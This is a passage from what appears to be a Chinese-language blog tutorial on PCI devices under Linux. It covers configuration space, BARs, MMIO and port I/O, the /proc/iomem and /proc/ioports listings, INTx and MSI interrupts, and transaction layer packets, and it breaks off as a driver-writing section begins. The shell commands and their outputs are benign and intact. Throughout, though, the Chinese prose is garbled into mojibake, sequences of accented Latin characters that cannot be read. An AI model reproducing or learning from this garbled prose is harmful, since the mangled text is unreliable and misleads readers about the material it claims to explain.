shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -s 00:02.0 -x</span><br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00<br>10: 08 00 00 fc 00 00 bd fe 00 00 00 00 00 00 00 00<br>20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11<br>30: 00 00 bc fe 00 00 00 00 00 00 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>åœ¨ Linux å½“ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ procfs æˆ– sysfs è¿™æ ·çš„æ–‡ä»¶ç³»ç»Ÿæ¥æŸ¥çœ‹è®¾å¤‡çš„ç›¸å…³é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡ <code>/proc/bus/pci/00/00.0</code> æ–‡ä»¶æˆ‘ä»¬åŒæ ·å¯ä»¥æŸ¥çœ‹ PCI è®¾å¤‡ <code>00:02.0</code> çš„é…ç½®ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/bus/pci/00/02.0 | xxd</span><br>00000000: 1310 b800 0301 0000 0000 0003 0000 0000  ................<br>00000010: 0800 00fc 0000 bdfe 0000 0000 0000 0000  ................<br>00000020: 0000 0000 0000 0000 0000 0000 f41a 0011  ................<br>00000030: 0000 bcfe 0000 0000 0000 0000 0000 0000  ................<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>/sys/devices/pci0000:00/0000:00:02.0/resource</code> è·å–åˆ°çš„ä¿¡æ¯ä¸­æ¯è¡Œè¡¨ç¤ºä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œä¸º MMIOï¼Œç¬¬äºŒè¡Œä¸º PMIOï¼Œä¸‰åˆ—ä¿¡æ¯åˆ†åˆ«ä¸ºèµ·å§‹åœ°å€ã€ç»ˆæ­¢åœ°å€ã€æ ‡å¿—ä½ ï¼Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:02.0/resource</span><br>0x00000000fc000000 0x00000000fdffffff 0x0000000000042208<br>0x00000000febd0000 0x00000000febd0fff 0x0000000000040200<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x00000000000c0000 0x00000000000dffff 0x0000000000000212<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>/sys/devices/pci0000:00/0000:00:02.0</code> ä¸‹çš„å…¶ä»–æ–‡ä»¶ä¹Ÿå¯ä»¥è®¿é—®è¯¥è®¾å¤‡çš„ä¸€äº›å…¶ä»–èµ„æºä¿¡æ¯ï¼ˆä¾‹å¦‚é€šè¿‡ <code>resource0</code> å¯ä»¥ç›´æ¥è®¿é—® MMIO ç©ºé—´ï¼Œ<code>resource1</code> åˆ™ä¸ºå…¶ PMIO ç©ºé—´ï¼‰</p><h2 id="äº”ã€PCI-Base-Address-register">äº”ã€PCI Base Address register</h2><h3 id="I-åŸºæœ¬æ¦‚å¿µ">I.åŸºæœ¬æ¦‚å¿µ</h3><p><strong>Base Address register</strong>ï¼ˆBARï¼‰æ˜¯ PCI è®¾å¤‡é…ç½®ç©ºé—´ä¸­éå¸¸é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œè¯¥ç»„å¯„å­˜å™¨ï¼ˆä¹Ÿç§°ä¹‹ä¸º BARç©ºé—´ï¼‰ç”¨ä»¥å®šä¹‰ PCI <strong>éœ€è¦çš„é…ç½®ç©ºé—´å¤§å°</strong>ä»¥åŠé…ç½® PCI è®¾å¤‡<strong>å ç”¨çš„åœ°å€ç©ºé—´</strong></p><p>æˆ‘ä»¬éƒ½çŸ¥é“ä¸è®¾å¤‡é€šä¿¡æœ‰ä¸¤ç§æ–¹å¼ï¼šMMIO ä¸ Port IOï¼Œç›¸åº”åœ° BAR çš„æ ¼å¼ä¹Ÿæœ‰å¦‚ä¸‹ä¸¤ç§ï¼š</p><ul><li><p><strong>MMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/CzV32oBP71at9Fg.png" alt="image.png"></p></li><li><p><strong>PMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/w4ind36EF9pPLcy.png" alt="image.png"></p></li></ul><h3 id="II-BAR-çš„åˆå§‹åŒ–">II. BAR çš„åˆå§‹åŒ–</h3><p>å½“ PCI è®¾å¤‡å¤ä½åï¼Œå…¶ä¼šåœ¨ BAR ä¸­å­˜æ”¾è¯¥è®¾å¤‡æ‰€éœ€ä½¿ç”¨çš„èµ„æºç±»å‹ä¸å¤§å°ï¼Œå½“æ“ä½œç³»ç»Ÿå¯¹ PCI æ€»çº¿è¿›è¡Œé…ç½®æ—¶ï¼Œé¦–å…ˆä¼šè·å–åˆ° PCI è®¾å¤‡çš„ BAR ä¸­çš„åˆå§‹ä¿¡æ¯ï¼Œä¹‹åæ ¹æ®è¯¥åˆå§‹ä¿¡æ¯åˆ†é…åˆç†çš„ <strong>PCI æ€»çº¿åŸŸåœ°å€</strong>ï¼Œå°†å…¶<strong>å†™å›åˆ° BAR å½“ä¸­</strong></p><p>é€šè¿‡ BAR è¿›è¡Œèµ„æºåˆ†é…çš„å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å½“ PCI å¤ä½æ—¶ï¼Œå…¶ä¼šå‘ BAR ä¸­å†™å…¥èµ„æºä¿¡æ¯ï¼Œ<strong>é€šè¿‡å°†ä½ä½çš„ bit è®¾ç½®ä¸º read only çš„ 0 æ¥æ ‡è¯†æœ€å°åœ°å€ç©ºé—´å¤§å°</strong></li><li>ç³»ç»Ÿè½¯ä»¶ï¼ˆä¾‹å¦‚ BIOSï¼‰é€šè¿‡å‘ BAR å†™ä¸€ä¸ª<strong>æ‰€æœ‰ bit éƒ½ä¸º 1 çš„å€¼</strong>æ¥ç¡®å®šä»å“ªä¸ª bit å¼€å§‹æ˜¯å¯å†™çš„ï¼Œä»è€Œè·å–åˆ°è¯¥ BAR å¯¹åº”æ‰€éœ€çš„<strong>æœ€å°åœ°å€ç©ºé—´</strong>ï¼ŒåŒæ—¶é€šè¿‡æœ€ä½ä½æ¥è·å–åˆ° BAR çš„ç±»å‹ï¼Œå¹¶å¯¹åº”ä¸ºè¿™äº› BAR ç©ºé—´åˆ†é…åœ°å€ï¼Œ<strong>å¹¶å°†åˆ†é…çš„åœ°å€å†™å› BAR ç©ºé—´ä¸­</strong></li></ul><blockquote><p>æ¯”å¦‚è¯´ä½ 20 bit éƒ½ä¸å¯å†™ï¼Œé‚£å°±æ˜¯è¯´è¿™ä¸ª bar æ‰€éœ€è¦çš„åœ°å€ç©ºé—´æœ€å°ä¸º 1MBï¼Œæœ€åä»åœ°å€æ€»çº¿ä¸Šåˆ†é…ä¸€ä¸ª1MB å¯¹é½çš„åœ°å€å†™å› bar é‡Œ</p></blockquote><h3 id="III-å¤„ç†å™¨åŸŸä¸-PCI-åŸŸé—´è®¿é—®">III. å¤„ç†å™¨åŸŸä¸ PCI åŸŸé—´è®¿é—®</h3><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œ<strong>å¤„ç†å™¨ä½¿ç”¨å­˜å‚¨å™¨åŸŸçš„åœ°å€ï¼Œè€Œ BAR å¯„å­˜å™¨å­˜æ”¾ PCI æ€»çº¿åŸŸçš„åœ°å€</strong>ï¼Œå› æ­¤å¤„ç†å™¨ä¸èƒ½ç›´æ¥é€šè¿‡ <code>BAR + offset</code> çš„æ–¹å¼è®¿é—® PCI è®¾å¤‡çš„ BAR ç©ºé—´ï¼Œè€Œåº”å½“è¦<strong>å°† PCI æ€»çº¿åŸŸçš„åœ°å€è½¬æ¢ä¸ºå­˜å‚¨å™¨åŸŸçš„åœ°å€</strong></p><p>ç”±æ­¤ï¼ŒPCI BAR ä¸­åœ°å€åœ¨å­˜å‚¨å™¨åŸŸä¸­çš†æœ‰ç€ç›¸åº”çš„æ˜ åƒï¼Œå½“å¤„ç†å™¨è®¿é—® PCI è®¾å¤‡çš„åœ°å€ç©ºé—´æ—¶ï¼Œé¦–å…ˆè®¿é—®è¯¥è®¾å¤‡åœ¨å­˜å‚¨å™¨åŸŸä¸­çš„åœ°å€ç©ºé—´ï¼Œä¹‹åé€šè¿‡ HOST ä¸»æ¡¥å°†å­˜å‚¨å™¨åŸŸä¸Šåœ°å€ç©ºé—´è½¬æ¢ä¸º PCI æ€»çº¿åŸŸçš„åœ°å€ç©ºé—´ï¼Œæœ€åé€šè¿‡ PCI æ€»çº¿å°†æ•°æ®å‘é€åˆ°æŒ‡å®šçš„è®¾å¤‡ä¸­</p><p>åä¹‹äº¦ç„¶ï¼Œå½“ PCI è®¾å¤‡éœ€è¦è®¿é—®å­˜å‚¨å™¨åŸŸçš„åœ°å€ç©ºé—´æ—¶ï¼ˆDMA æ“ä½œï¼‰ï¼Œé¦–å…ˆéœ€è¦è®¿é—®è¯¥å­˜å‚¨å™¨åœ°å€ç©ºé—´æ‰€å¯¹åº”çš„ PCI æ€»çº¿ç©ºé—´ï¼Œä¹‹åé€šè¿‡ HOST ä¸»æ¡¥å°†å…¶è½¬æ¢ä¸ºå­˜å‚¨å™¨åœ°å€ç©ºé—´ï¼Œå†ç”± DDR æ§åˆ¶å™¨å®Œæˆå¯¹å­˜å‚¨å™¨çš„è¯»å†™</p><h2 id="å…­ã€PCI-è®¾å¤‡å†…å­˜-ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼">å…­ã€PCI è®¾å¤‡å†…å­˜ &amp; ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼</h2><p>å‰é¢æˆ‘ä»¬è®²äº† PCI è®¾å¤‡ä¸ç‰¹æ€§å’Œé…ç½®ç›¸å…³çš„é…ç½®ç©ºé—´ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸ PCI è®¾å¤‡ä¸å®é™…æ“ä½œç›¸å…³çš„å†…å­˜æ˜ å°„ç©ºé—´ä¸ç«¯å£æ˜ å°„ç©ºé—´</p><p>æ‰€æœ‰ IO è®¾å¤‡çš„å†…å­˜ä¸ç«¯å£ç©ºé—´éœ€è¦è¢«æ˜ å°„åˆ°å¯¹åº”çš„åœ°å€ç©ºé—´/ç«¯å£ç©ºé—´ä¸­æ‰èƒ½è®¿é—®ï¼Œè¿™éœ€è¦å ç”¨éƒ¨åˆ†çš„å†…å­˜åœ°å€ç©ºé—´ä¸ç«¯å£åœ°å€ç©ºé—´ï¼Œå³æˆ‘ä»¬æœ‰ä¸¤ç§æ˜ å°„å¤–è®¾èµ„æºçš„æ–¹å¼ï¼š</p><ul><li><strong>MMIO</strong>ï¼ˆMemory-mapped I/Oï¼‰ï¼šå³å†…å­˜æ˜ å°„ IOã€‚è¿™ç§æ–¹å¼å°† IO è®¾å¤‡çš„å†…å­˜ä¸å¯„å­˜å™¨æ˜ å°„åˆ°æŒ‡å®šçš„å†…å­˜åœ°å€ç©ºé—´ä¸Šï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡å¸¸è§„çš„è®¿é—®å†…å­˜çš„æ–¹å¼æ¥ç›´æ¥è®¿é—®åˆ°è®¾å¤‡çš„å¯„å­˜å™¨ä¸å†…å­˜</li><li><strong>PMIO</strong>ï¼ˆPort-mapped I/Oï¼‰ï¼šå³ç«¯å£æ˜ å°„ IOã€‚è¿™ç§æ–¹å¼å°† IO è®¾å¤‡çš„å¯„å­˜å™¨ç¼–ç åˆ°æŒ‡å®šçš„ç«¯å£ä¸Šï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è®¿é—®ç«¯å£çš„æ–¹å¼æ¥è®¿é—®è®¾å¤‡çš„å¯„å­˜å™¨ä¸å†…å­˜ï¼ˆä¾‹å¦‚åœ¨ x86 ä¸‹é€šè¿‡ <code>in</code> ä¸ <code>out</code> è¿™ä¸€ç±»çš„æŒ‡ä»¤å¯ä»¥è¯»å†™ç«¯å£ï¼‰ã€‚IO è®¾å¤‡é€šè¿‡ä¸“ç”¨çš„é’ˆè„šæˆ–è€…ä¸“ç”¨çš„æ€»çº¿ä¸ CPU è¿æ¥ï¼Œè¿™ä¸å†…å­˜åœ°å€ç©ºé—´ç›¸ç‹¬ç«‹ï¼Œå› æ­¤åˆç§°ä½œ isolated I/O</li></ul><p>å®Œæˆæ˜ å°„ä¹‹åé€šè¿‡ç›¸åº”çš„å†…å­˜/ç«¯å£è®¿é—®åˆ°çš„ä¾¿æ˜¯ PCI è®¾å¤‡çš„å†…å­˜/ç«¯å£åœ°å€ç©ºé—´</p><blockquote><p>ä¾‹å¦‚å®æ¨¡å¼ä¸‹çš„ <code>0xA0000 ~ 0xBFFFF</code> è¿™ 128KB åœ°å€ç©ºé—´é€šå¸¸è¢«ç”¨ä½œæ˜¾å­˜çš„æ˜ å°„ï¼Œå½“æˆ‘ä»¬åœ¨å®æ¨¡å¼ä¸‹è¯»å†™è¿™å—åŒºåŸŸæ—¶é€šå¸¸ä¾¿æ˜¯ç›´æ¥è¯»å†™æ˜¾å¡ä¸Šçš„æ˜¾å­˜ï¼Œè€Œå¹¶éæ™®é€šçš„å†…å­˜</p></blockquote><p>é€šè¿‡ procfs çš„ <code>/proc/iomem</code> æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç‰©ç†åœ°å€ç©ºé—´çš„æƒ…å†µï¼Œå…¶ä¸­æˆ‘ä»¬ä¾¿èƒ½çœ‹åˆ°å„ç§è®¾å¤‡æ‰€å ç”¨çš„åœ°å€ç©ºé—´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/iomem</span><br>00000000-00000fff : Reserved<br>00001000-0009fbff : System RAM<br>0009fc00-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000c91ff : Video ROM<br>000c9800-000ca1ff : Adapter ROM<br>000ca800-000ccbff : Adapter ROM<br>000f0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7ffdffff : System RAM<br>  1f400000-20200e70 : Kernel code<br>  20200e71-2105843f : Kernel data<br>  2132b000-217fffff : Kernel bss<br>7ffe0000-7fffffff : Reserved<br>80000000-febfffff : PCI Bus 0000:00<br>  fc000000-fdffffff : 0000:00:02.0<br>    fc000000-fdffffff : cirrus<br>  feb80000-febbffff : 0000:00:03.0<br>  febd0000-febd0fff : 0000:00:02.0<br>    febd0000-febd0fff : cirrus<br>  febd1000-febd1fff : 0000:00:03.0<br>  febd2000-febd2fff : 0000:00:04.0<br>  febd3000-febd3fff : 0000:00:05.0<br>fec00000-fec003ff : IOAPIC 0<br>fee00000-fee00fff : Local APIC<br>feffc000-feffffff : Reserved<br>fffc0000-ffffffff : Reserved<br></code></pre></td></tr></table></figure><p>é€šè¿‡ procfs çš„ <code>/proc/ioports</code> æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ IO ç«¯å£æƒ…å†µï¼Œå…¶ä¸­ä¾¿åŒ…æ‹¬å„ç§è®¾å¤‡å¯¹åº”çš„ PMIO ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/ioports</span><br>0000-0cf7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>  0170-0177 : 0000:00:01.1<br>    0170-0177 : ata_piix<br>  01f0-01f7 : 0000:00:01.1<br>    01f0-01f7 : ata_piix<br>  0376-0376 : 0000:00:01.1<br>    0376-0376 : ata_piix<br>  03f2-03f2 : floppy<br>  03f4-03f5 : floppy<br>  03f6-03f6 : 0000:00:01.1<br>    03f6-03f6 : ata_piix<br>  03f7-03f7 : floppy<br>  03f8-03ff : serial<br>  0505-0505 : QEMU0001:00<br>  0510-051b : QEMU0002:00<br>    0510-051b : fw_cfg_io<br>  0600-063f : 0000:00:01.3<br>    0600-0603 : ACPI PM1a_EVT_BLK<br>    0604-0605 : ACPI PM1a_CNT_BLK<br>    0608-060b : ACPI PM_TMR<br>  0700-070f : 0000:00:01.3<br>    0700-0708 : piix4_smbus<br>0cf8-0cff : PCI conf1<br>0d00-adff : PCI Bus 0000:00<br>ae0f-aeff : PCI Bus 0000:00<br>af20-afdf : PCI Bus 0000:00<br>afe0-afe3 : ACPI GPE0_BLK<br>afe4-ffff : PCI Bus 0000:00<br>  c000-c03f : 0000:00:05.0<br>    c000-c03f : virtio-pci-legacy<br>  c040-c05f : 0000:00:01.2<br>    c040-c05f : uhci_hcd<br>  c060-c07f : 0000:00:03.0<br>    c060-c07f : virtio-pci-legacy<br>  c080-c09f : 0000:00:04.0<br>    c080-c09f : virtio-pci-legacy<br>  c0a0-c0bf : 0000:00:06.0<br>    c0a0-c0bf : virtio-pci-legacy<br>  c0c0-c0cf : 0000:00:01.1<br>    c0c0-c0cf : ata_piix<br></code></pre></td></tr></table></figure><h2 id="ä¸ƒã€PCI-ä¸­æ–­æœºåˆ¶">ä¸ƒã€PCI ä¸­æ–­æœºåˆ¶</h2><p>PCI è®¾å¤‡æœ‰ä¸¤ç§æ‰“ä¸­æ–­çš„æ–¹æ³•ï¼šä¼ ç»Ÿçš„ INTx ä¸­æ–­ä¸ MSI ä¸­æ–­ï¼Œå‡ºäºå…¼å®¹çš„éœ€è¦ PCIe å®Œå…¨ç»§æ‰¿äº†è¿™ä¸ªç‰¹æ€§</p><h3 id="I-INTx-ä¸­æ–­">I. INTx ä¸­æ–­</h3><p>INTx ç±»å‹çš„ä¸­æ–­å³ä¼ ç»Ÿçš„<strong>é€šè¿‡ä¸­æ–­å¼•è„šæ¥äº§ç”Ÿçš„ä¸­æ–­</strong>ï¼ŒPCI æ€»çº¿ä½¿ç”¨ <code>INTA#</code> ã€<code>INTB#</code> ã€<code>INTC#</code> ã€<code>INTD#</code>  ä¿¡å·ï¼ˆä½ç”µå¹³æœ‰æ•ˆï¼‰å‘å¤„ç†å™¨å‘å‡ºä¸­æ–­è¯·æ±‚ï¼Œä¸è¿‡å¤šæ•°è®¾å¤‡ä»…ä½¿ç”¨ <code>INTA#</code> ä¿¡å·</p><p>ä¸‹å›¾ä¸ºä¸€ä¸ªäº§ç”Ÿ  <code>INTA#</code> ä¸­æ–­ä¿¡å·çš„æµç¨‹ï¼š</p><ul><li>è®¾å¤‡å‘å—æ¡¥ä¸Šçš„ä¸­æ–­æ§åˆ¶å™¨æ‰“ä¸€ä¸ª  <code>INTA#</code> ï¼Œä¸­æ–­æ§åˆ¶å™¨è½¬ä¸º <code>INTR</code> ä¿¡å·åé€šè¿‡ APIC bus æ‰“å‘å¤„ç†å™¨</li><li>æ¥å—ä¸­æ–­ä¿¡å·çš„å¤„ç†å™¨ï¼ˆæœªè®¾ç½®åˆ™é»˜è®¤éƒ½æ‰“åˆ° CPU0ï¼‰é€šè¿‡ä¸­æ–­å‘é‡è¡¨æ‰§è¡Œå¯¹åº”çš„å¤„ç†ç¨‹åº</li></ul><p><img src="https://s2.loli.net/2022/08/31/32jbJDlOpRKSIqy.png" alt="image.png"></p><p>åœ¨ PCI æ€»çº¿ä¸­ï¼Œè®¾å¤‡çš„ <code>INTx å¼•è„š</code>æœ€ç»ˆè¦è¿æ¥åˆ°ä¸­æ–­æ§åˆ¶å™¨çš„ <code>IRQ å¼•è„š</code> ï¼Œä¸‹å›¾æ˜¯ä¸€ä¸ªä¸‰ PCI æ’æ§½ä¸ä¸­æ–­æ§åˆ¶å™¨å¼•è„šè¿›è¡Œè¿æ¥çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/08/31/ZyIur4L7U5oCjJO.png" alt="çŸ¥ä¹å·çš„å›¾"></p><p>è¿˜è®°å¾—æˆ‘ä»¬å‰æ–‡æ‰€è®²çš„ PCI é…ç½®ç©ºé—´ä¸­çš„ <code>Interrupt Pin</code> ä¸ <code>Interrupt Line</code> åŸŸå—ï¼Ÿç°åœ¨æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æ˜ç¡®å…¶å…·ä½“ç”¨é€”äº†ï¼š</p><ul><li><code>Interrupt Pin</code>ï¼šè®°å½•è®¾å¤‡åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ª INTx ä¸­æ–­ä¿¡å·</li><li><code>Interrupt Line</code>ï¼šè®°å½•è®¾å¤‡è¿æ¥çš„å¼•è„š</li></ul><p><img src="https://s2.loli.net/2022/08/31/jbtsuypMvza9Nex.png" alt="image.png"></p><h3 id="II-MSI-MSI-X-ä¸­æ–­">II. MSI/MSI-X ä¸­æ–­</h3><p><strong>Message Signaled Interrupt</strong> æ˜¯ä¸€ç§æ›´ä¸ºç°ä»£åŒ–ä¸æ™®éçš„ PCI ä¸­æ–­æœºåˆ¶ï¼Œ<strong>MSI-eXtend</strong> åˆ™ä¸ºå…¶å‡çº§ç‰ˆï¼Œè¯¥æœºåˆ¶çš„å¼•å…¥æ˜¯ä¸ºäº†æ¶ˆé™¤ INTx çš„è¾¹å¸¦ä¿¡å·ï¼Œç›®å‰ç»å¤§å¤šæ•° PCIe è®¾å¤‡å·²ä¸å†ä½¿ç”¨ä¼ ç»Ÿçš„ INTx ä¸­æ–­ï¼Œè€Œæ˜¯ä½¿ç”¨ MSI/MSI-X æäº¤ä¸­æ–­è¯·æ±‚</p><p>åœ¨ PCIe è®¾å¤‡ä¸­æœ‰ç€ä¸¤ä¸ª Capability ç»“æ„ï¼Œåˆ†åˆ«å¯¹åº” MSI ä¸ MSI-Xï¼Œé€šå¸¸ä¸€ä¸ª PCIe è®¾å¤‡ä»…ä¼šåŒ…å«å…¶ä¸­ä¸€ä¸ªã€‚å¯¹äº MSI è€Œè¨€å…¶ Capability ID ä¸º 5ï¼Œä¸€å…±æœ‰å››ç§ç»“æ„ï¼Œåˆ†åˆ«å¯¹åº” 32 ä½ä¸ 64 ä½çš„ Message ç»“æ„ï¼Œä»¥åŠå¯¹åº”çš„å¸¦ä¸Šä¸­æ–­ Masking çš„ç»“æ„</p><p><img src="https://s2.loli.net/2022/08/31/v657FsLHc9Kx2Aq.png" alt="çŸ¥ä¹å·çš„å›¾"></p><p>MSI/MSI-X æœ¬è´¨ä¸Šæ˜¯é€šè¿‡<strong>å‘ç‰¹å®šçš„å†…å­˜åŒºåŸŸè¿›è¡Œå†™å…¥</strong>æ¥è¾¾åˆ°ä¸­æ–­è§¦å‘çš„æ•ˆæœï¼Œå½“ PCI è®¾å¤‡æäº¤è¯·æ±‚æ—¶ï¼Œå…¶å‘ <code>MSI/MSI-x Capability</code> ç»“æ„ä¸­çš„ <code>Message Address</code> åœ°å€ï¼ˆPCIæ€»çº¿åŸŸï¼‰å†™å…¥ <code>Message Data</code> æ•°æ®ï¼Œä»è€Œäº§ç”Ÿä¸€ä¸ªå­˜å‚¨å™¨å†™ TLPï¼Œç”±æ­¤å‘å¤„ç†å™¨æäº¤å­˜å‚¨å™¨å†™è¯·æ±‚</p><p>MSI ä»…æ”¯æŒ 32 ä¸ªè¿ç»­çš„ä¸­æ–­å‘é‡ï¼Œè€Œ MSI-X æ”¯æŒ 2048 ä¸ªéè¿ç»­çš„ä¸­æ–­å‘é‡ï¼Œä½† MSI-X çš„ä¸­æ–­å‘é‡ä¿¡æ¯å¹¶ä¸åƒ MSI é‚£æ ·ç›´æ¥å­˜æ”¾åœ¨é…ç½®ç©ºé—´ï¼Œè€Œæ˜¯å­˜æ”¾åœ¨ MMIO ç©ºé—´ä¸­ï¼Œé€šè¿‡BIRï¼ˆBase address Indicator Registerï¼‰ä¸ BAR æ¥ç¡®å®šå…¶åœ¨ MMIO ä¸­çš„å…·ä½“ä½ç½®</p><p><img src="https://s2.loli.net/2022/08/31/QpYXgx5eKczydkE.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/31/EXghx6vUV8S1tdN.png" alt="image.png"></p><p>å…¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/08/31/a1IuvYtj72lS63K.png" alt="image.png"></p><h2 id="å…«ã€Transaction-Layer-Package">å…«ã€Transaction Layer Package</h2><p>ä¸Šä¸€èŠ‚æˆ‘ä»¬æåˆ°äº†ä¸€ä¸ªè¯å« <code>TLP</code>ï¼Œè¿™ä¸€èŠ‚æˆ‘ä»¬ç®€è¦ä»‹ç»ä¸€ä¸‹è¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿</p><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦ä»‹ç» PCI è®¾å¤‡åº•å±‚çš„é€šä¿¡ç»“æ„ï¼Œç±»ä¼¼äºè®¡ç½‘çš„ OSI ä¸ƒå±‚æ¨¡å‹ï¼ŒPCI æ€»çº¿ä¹Ÿå¯ä»¥ç”±ä¸‹åˆ°ä¸Šåˆ’åˆ†ä¸º <strong>ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰ã€æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰ã€äº‹åŠ¡å±‚ï¼ˆTransaction Layerï¼‰</strong>ï¼ŒTLP å³ <strong>Transaction Layer Package</strong>ï¼šåœ¨äº‹åŠ¡å±‚è¿›è¡Œä¼ è¾“çš„æ•°æ®åŒ…</p><p><img src="https://s2.loli.net/2022/08/31/QVYRUoA4JWbyFZD.png" alt="image.png"></p><h1>0x02. Linux PCI é©±åŠ¨ç¼–å†™ï¼ˆğŸ•Šï¼‰</h1><p>æœ‰çš„æ—¶å€™ä½ å¯èƒ½è‡ªå·±æ‰‹å·¥ç³Šäº†ä¸€ä¸ª PCI è®¾å¤‡ï¼ˆï¼Ÿï¼‰ï¼Œä¸‡åˆ†æ¬¢å–œåœ°æƒ³è¦ç›´æ¥å¾€è‡ªå®¶ğŸ’»çš„ PCI æ’æ§½ä¸Šä¸€æ’å°±å¼€ç”¨äº†ï¼Œä½†æ˜¯çªç„¶å‘ç°<strong>å¹¶æ²¡æœ‰ä¸€ç§ä¸‡èƒ½çš„ PCI é©±åŠ¨èƒ½å¤Ÿç›´æ¥é€‚é…ä½ 